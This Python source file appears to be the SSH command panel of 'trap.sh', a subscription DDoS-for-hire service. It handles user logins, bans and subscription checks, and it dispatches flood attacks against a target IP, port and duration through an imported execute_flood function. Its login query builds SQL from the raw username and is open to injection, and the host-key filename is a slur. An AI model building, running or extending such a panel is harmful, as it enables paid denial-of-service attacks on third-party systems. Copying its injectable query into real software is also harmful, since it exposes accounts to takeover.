#!/usr/bin/env python
import time
import sshfunctions
from sshfunctions import clear_terminal, execute_flood, functions, User, colored_, send_banner, methodlist, usage, connected, running, get_attack_count

import os
import io
import sys
import uuid
import base64
import socket
import _thread
import sqlite3
import hashlib
import paramiko
import threading
import traceback

from binascii import hexlify
from colorama import Fore, Back, Style
from paramiko.py3compat import b, u, decodebytes

online_users = []

def check_login(username: str, password: str) -> bool:
    connection = sqlite3.connect("./trappers.db", isolation_level=None)
    cursor = connection.cursor()
    row = cursor.execute("SELECT salt, hpassword FROM users WHERE username = '{}'".format(username)).fetchone()
    salt, hpassword = row  # Unpacking the row information - btw this would fail if the username didn't exist
    hashedIncomingPwd = hashlib.sha512((salt + password).encode("UTF-8")).hexdigest()
    connection.close()
    if hashedIncomingPwd == hpassword:
        return True
    else:
        return False

paramiko.util.log_to_file("demo_server.log")

host_key = paramiko.RSAKey(filename="fag")
# host_key = paramiko.DSSKey(filename='test_dss.key')

print("Read key: " + str(hexlify(host_key.get_fingerprint()), 'utf-8'))


class Server(paramiko.ServerInterface):
    # 'data' is the output of base64.b64encode(key)
    # (using the "user_rsa_key" files)
    data = (
        b"AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp"
        b"fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC"
        b"KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT"
        b"UWT10hcuO4Ks8="
    )
    good_pub_key = paramiko.RSAKey(data=decodebytes(data))

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if check_login(username, password) == True:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        print("Auth attempt with key: " + u(hexlify(key.get_fingerprint())))
        if (username == "robey") and (key == self.good_pub_key):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_with_mic(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        """
        .. note::
            We are just checking in `AuthHandler` that the given user is a
            valid krb5 principal! We don't check if the krb5 principal is
            allowed to log in on the server, because there is no way to do that
            in python. So if you develop your own SSH server with paramiko for
            a certain platform like Linux, you should call ``krb5_kuserok()`` in
            your local kerberos library to make sure that the krb5_principal
            has an account on the server and is allowed to log in as a user.
        .. seealso::
            `krb5_kuserok() man page
            <http://www.unix.com/man-page/all/3/krb5_kuserok/>`_
        """
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_keyex(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return True

    def get_allowed_auths(self, username):
        return "gssapi-keyex,gssapi-with-mic,password,publickey"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ):
        return True


DoGSSAPIKeyExchange = True

banner = f"""
                  ╔═══════════════════════════╗
                  ║         [trap.sh]         ║
        ╔═════════╩═══════════════════════════╩═════════╗
        ║                                               ║
        ║       ████████╗██████╗  █████╗ ██████╗        ║
        ║       ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗       ║
        ║          ██║   ██████╔╝███████║██████╔╝       ║
        ║          ██║   ██╔══██╗██╔══██║██╔═══╝        ║
        ║          ██║   ██║  ██║██║  ██║██║            ║
        ║          ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝            ║
        ║                                               ║
        ╚═════════╦═══════════════════════════╦═════════╝
                  ║        [ᴇᴠᴇʀʏᴡʜᴇʀᴇ]       ║
                  ╚═══════════════════════════╝\n"""

for i in range(len(banner.split("\n"))):
    print(colored_(banner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))]))

# now connect
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", 25565))
except Exception as e:
    print("*** Bind failed: " + str(e))
    traceback.print_exc()
    sys.exit(1)

def process_command(command: str, client, addr, chan: paramiko.Channel):
    try:
        username = chan.transport.get_username()
        params = command.split(" ")
        cmd = params[0]
        if len(params) > 1:
            params = params[1:]
        if cmd == 'quit' or cmd == 'exit':
            functions[cmd](chan.transport)
            return
        if cmd == 'attacks':
            functions[cmd](chan)
            return
        if cmd == 'adduser':
            sztr = functions[cmd](chan, params[0], params[1], int(params[2]), int(params[3]))
            if sztr == 'failure':
                chan.send(colored_(f"\r\n╚═[!]~> Error occured while adding user!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif sztr == 'success':
                chan.send(colored_(f"\r\n╚═[W]~> Successfully added {params[0]}!", start_fg=[10, 80, 190], end_fg=[40,190,0]))
            return
        if cmd == 'addsub':
            sztr = functions[cmd](chan, int(params[1]), int(params[2]), User(params[0]).uid)
            if sztr == 1:
                chan.send(colored_(f"\r\n╚═[!]~> Error occured while adding user!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif sztr == 2:
                chan.send(colored_(f"\r\n╚═[W]~> Successfully added sub: {params[1]} to {params[0]}!", start_fg=[10, 80, 190], end_fg=[40,190,0]))
            elif sztr == 2:
                chan.send(colored_(f"\r\n╚═[!]~> Insufficient permissions!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            return
        if cmd == 'help':
            functions[cmd](chan)
            return
        if cmd == 'cls':
            functions[cmd](chan)
            return
        if cmd == 'sublist':
            functions[cmd](chan)
            return
        if cmd == 'user':
            result = functions[cmd](chan, params[0])
            if result == 0:
                chan.send(colored_(f"\r\n╚═[!]~> Insufficient permissions!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif result == 1:
                chan.send(colored_(f"\r\n╚═[!]~> Invalid username!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            return
        if cmd == 'ban':
            result = functions[cmd](chan, params[0])
            if result == 0:
                chan.send(colored_(f"\r\n╚═[!]~> Insufficient permissions!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif result == 1:
                chan.send(colored_(f"\r\n╚═[!]~> Invalid username!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif result == 2:
                chan.send(colored_(f"\r\n╚═[W]~> Successfully banned \"{params[0]}\"!", start_fg=[10, 80, 190], end_fg=[40,190,0]))
            return
        if cmd == 'unban':
            result = functions[cmd](chan, params[0])
            if result == 0:
                chan.send(colored_(f"\r\n╚═[!]~> Insufficient permissions!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif result == 1:
                chan.send(colored_(f"\r\n╚═[!]~> Invalid username!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            elif result == 2:
                chan.send(colored_(f"\r\n╚═[W]~> Successfully unbanned \"{params[0]}\"!", start_fg=[10, 80, 190], end_fg=[40,190,0]))
            return
        if cmd == 'changepwd':
            if functions[cmd](chan, params[0]) == True:
                chan.send(colored_(f"\r\n╚═[W]~> Successfully changed password to \"{params[0]}\"!", start_fg=[10, 80, 190], end_fg=[40,190,0]))
            else:
                chan.send(colored_(f"\r\n╚═[!]~> Error occured while changing password!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            return
        
        try:
            if execute_flood(chan, cmd, params) == True:
                chan.send(colored_(f"\r\n╚═[W]~> {cmd} attack sent to {params[0]}:{params[1]} for {params[2]} seconds!", start_fg=[10, 80, 190], end_fg=[40,190,0])) 
                return
            else:
                chan.send(colored_(f"\r\n╚═[!]~> Error occured sending attack!", start_fg=[10, 80, 190], end_fg=[190,40,0]))
                return
        except Exception as e:
            print('1:' + e)

        raise("No command supplied!")
        return
        #functions[cmd](chan, params)
    except Exception as e:
        #chan.send(colored_(f"\r\n╔═════[trap.sh]\r\n", start_fg=[10, 80, 190], end_fg=[190,40,0]))
        try:
            z = usage[cmd]
            chan.send(colored_(f"\r\n╚═[!]~> Usage: {z}", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            return
        except Exception as e2:
            chan.send(colored_(f"\r\n╚═[!]~> ", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            chan.send(f'"{cmd}" is an invalid command!\r\n')
            print(e2)
        print(e)

def update_title(chan: paramiko.Channel):
    u = User(chan.transport.get_username())
    while True:
        try:
            chan.send(f'\033]0;[{chan.transport.get_username()} @ trap.sh] [{connected} mandem] [{u.daysleft()} days left] [{running} running] [{str(get_attack_count())} attacks]\007')
            time.sleep(1000)
        except Exception as e:
            print(e)
            return

def manage_conn(client, addr):
    #print(colored_(f"{addr[0]}", start_fg=[10, 80, 190], end_fg=[190,40,0]))

    try:
        t = paramiko.Transport(client, gss_kex=DoGSSAPIKeyExchange)
        t.set_gss_host(socket.getfqdn(""))
        try:
            t.load_server_moduli()
        except:
            print("(Failed to load moduli -- gex will be unsupported.)")
            raise
        t.add_server_key(host_key)
        server = Server()
        try:
            t.start_server(server=server)
        except paramiko.SSHException:
            print("*** SSH negotiation failed.")
            return

        # wait for auth
        chan = t.accept(20)
        if chan is None:
            print("*** No channel.")
            return
        #print("Authenticated!")
        server.event.wait(10)
        if not server.event.is_set():
            print("*** Client never asked for a shell.")
            return

        
        current_user = User(chan.transport.get_username())
        ip = f"{chan.transport.getpeername()[0]}"

        #maybe check here for 2fa if different IP as last

        current_user.update_ip(ip)
        if current_user.status == 0:
            chan.send('User is banned!\r\n')
            return
        if current_user.daysleft() < 0:
            chan.send('Subscription expired!')
            return

        print(colored_(f"[+] {current_user.username} logged in from {ip}", start_fg=[10, 80, 190], end_fg=[190,40,0]))
        _thread.start_new_thread(update_title, (chan,))
        command_history = []
        clear_terminal(chan) #send banner and clear terminal
        
        while True: #process commands
            #this just checks if current user gets banned during session
            current_user = User(current_user.username)
            if current_user.status == 0:
                chan.send('User was banned!\r\n')
                chan.close() 

            chan.send(colored_(f"\r\n╔═════[trap.sh]\r\n", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            chan.send(colored_(f"╠═{current_user.username}~> ", start_fg=[10, 80, 190], end_fg=[190,40,0]))
            f = chan.makefile("rU")


            #build command on screen
            cmdstr = ''
            cmd = ''
            upm = 0
            while str(cmd) != str('\\r'):
                cmd = f.read(1)
                cmd = str(cmd).split("'")[1]
                if cmd == '\\r': #enter key
                    break
                elif cmd == '\\x7f': #handle backspace
                    if(len(cmdstr) > 0):
                        chan.send('\b \b')
                        cmdstr = cmdstr[:-1]
                    continue
                elif cmd == '\\x03': #ctrl+c
                    chan.close()
                    return
                elif cmd == '\\x0c': #ctrl+l
                    cmdstr = 'cls'
                    break
                elif cmd.find('\\x1b') != -1: #arrows / command history
                    for x in range(len(cmdstr)):
                        chan.send('\b \b')
                        cmdstr = cmdstr[:-1]

                    ncmd = str(f.read(2))
                    index = (len(command_history) - 1) - upm
                    if ncmd.find('A') != -1:
                        if len(command_history) > upm:
                            chan.send(str(command_history[index]))
                            cmdstr = str(command_history[index])
                        upm += 1
                    elif ncmd.find('B') != -1:
                        if len(command_history) > upm:
                            chan.send(str(command_history[index]))
                            cmdstr = str(command_history[index])
                        upm -= 1
                    if upm < 0:
                        upm = 0
                    if upm > (len(command_history) - 1):
                        upm = (len(command_history) - 1)
                else:
                    chan.send(cmd)
                    cmdstr = cmdstr + str(cmd)


            #cmdstr = f.readline().strip("\r\n")
            print(colored_(str(f'[+] {current_user.username} sent "{cmdstr}" from {ip}') + '\r\n', start_fg=[190,40,0], end_fg=[10, 80, 190]))
            process_command(cmdstr, client, addr, chan)
            command_history.append(cmdstr)
    except Exception as e:
        print("*** Caught exception: " + str(e.__class__) + ": " + str(e))
        traceback.print_exc()
        try:
            t.close()
        except:
            pass
        return

while True:
    try:
        sock.listen(100)
        #ifprint("Listening for connection ...")
        client, addr = sock.accept()
        _thread.start_new_thread(manage_conn, (client, addr, ))
    except Exception as e:
        print("*** Listen/accept failed: " + str(e))
        traceback.print_exc()
        sys.exit(1)

    

